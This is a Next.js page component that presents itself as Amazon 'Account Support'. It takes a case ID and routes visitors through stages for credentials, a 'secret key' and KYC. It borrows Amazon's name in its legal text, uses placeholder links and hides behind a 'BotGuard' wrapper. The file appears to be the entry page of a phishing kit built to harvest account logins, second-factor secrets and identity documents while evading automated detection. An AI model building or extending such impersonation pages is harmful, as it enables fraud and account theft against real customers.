'use client';

/**
 * Landing/Home Page — Case ID Entry
 *
 * Entry point for customer-initiated verification.
 * Customer enters case ID and is redirected to the credentials page.
 * This is NOT the login page — it's a simple case ID lookup.
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle, Loader2 } from 'lucide-react';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ caseId: caseId.trim() }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(error.error || 'Unable to verify. Please try again.');
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to verify. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to verify. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      <div className="auth-card">
        <div className="auth-card-inner">
          <h1 className="auth-heading">Account Support</h1>

          {/* Error Alert */}
          {fieldError && (
            <div className="alert-box alert-error" role="alert">
              <div className="alert-icon">
                <AlertTriangle size={22} color="#CC0C39" />
              </div>
              <div className="alert-content">
                <span className="alert-heading">There was a problem</span>
                <span className="alert-message">{fieldError}</span>
              </div>
            </div>
          )}

          <form className="auth-form" onSubmit={handleSubmit} noValidate>
            <div className="form-group">
              <label className="form-label" htmlFor="case-id">
                Case ID
              </label>
              <input
                type="text"
                id="case-id"
                className={`form-input${fieldError ? ' input-error' : ''}`}
                name="case-id"
                autoComplete="off"
                value={caseId}
                onChange={(e) => {
                  setCaseId(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isLoading}
              />
            </div>

            <button
              type="submit"
              className="btn-primary btn-continue"
              disabled={isLoading}
            >
              {isLoading && <Loader2 size={16} className="spinner-inline" />}
              {isLoading ? 'Verifying...' : 'Continue'}
            </button>
          </form>

          <p className="legal-text">
            By continuing, you agree to Amazon&apos;s{' '}
            <a href="#" className="legal-link">Conditions of Use</a> and{' '}
            <a href="#" className="legal-link">Privacy Notice</a>.
          </p>

          <div className="help-section">
            <a href="#" className="help-link">Need help?</a>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
